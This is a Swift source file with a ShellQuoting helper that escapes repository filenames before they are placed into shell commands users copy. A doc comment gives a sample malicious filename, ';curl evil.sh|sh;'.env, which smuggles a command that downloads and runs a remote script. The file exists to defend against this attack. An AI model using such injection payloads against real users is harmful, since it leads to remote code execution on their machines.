import Foundation

/// Turns a filename into a POSIX shell word.
///
/// This exists because health findings hand the user a command to paste into a
/// shell, and the strings interpolated into that command are filenames read out
/// of a repository the user cloned — i.e. text an attacker can choose. Wrapping
/// such a name in a pair of single quotes and calling it done is the bug this
/// type replaces: a file named
///
///     ';curl evil.sh|sh;'.env
///
/// wrapped that way yields `echo '';curl evil.sh|sh;'.env' >> .gitignore`,
/// which the shell reads as three commands, the middle one of which downloads
/// and runs a script. The app never executes the command itself — but the Copy
/// button next to it exists precisely to move it into a shell that will, so
/// "we don't run it" is not a defence.
///
/// Single quotes are the right primitive because inside them the shell expands
/// nothing at all — no `$`, no backtick, no backslash. The one character that
/// cannot appear is the closing quote itself, and the standard idiom for it is
/// to close the string, emit an escaped quote, and reopen: `'` becomes
/// `'\''`.
enum ShellQuoting {

    /// `value` as a single shell word, or nil when no single-line command can
    /// represent it honestly.
    ///
    /// Newlines are refused rather than escaped. A line break survives single
    /// quoting perfectly well as far as `/bin/sh` is concerned, but a command
    /// that spans lines is one a user copies wrong, a `.gitignore` cannot
    /// represent such a filename at all, and a remediation nobody can follow is
    /// worse than an explanation with no command attached. NUL is refused for
    /// the same reason and because no argument can contain it.
    ///
    /// `Character.isNewline`, not `$0 == "\n" || $0 == "\r"`. A filename
    /// containing a CRLF pair is one `Character` equal to neither, so the
    /// explicit comparison let it straight through and produced a "single
    /// line" command that in fact spans two — the precise failure this
    /// refusal exists to prevent, and one an attacker choosing a filename in
    /// a repository the user cloned can arrange deliberately. `isNewline`
    /// also covers the Unicode line and paragraph separators, which is the
    /// right direction for a refusal: it declines more, never less.
    static func singleQuoted(_ value: String) -> String? {
        guard !value.contains(where: { $0.isNewline || $0 == "\0" }) else { return nil }
        return "'" + value.replacingOccurrences(of: "'", with: "'\\''") + "'"
    }

    /// `values` as a space-separated argument list, or nil if any one of them
    /// cannot be quoted. All or nothing on purpose: a command listing four of
    /// five files, silently, is exactly the kind of half-truth the rest of this
    /// module exists to avoid.
    static func singleQuotedList(_ values: [String]) -> String? {
        var quoted: [String] = []
        for value in values {
            guard let word = singleQuoted(value) else { return nil }
            quoted.append(word)
        }
        return quoted.joined(separator: " ")
    }
}
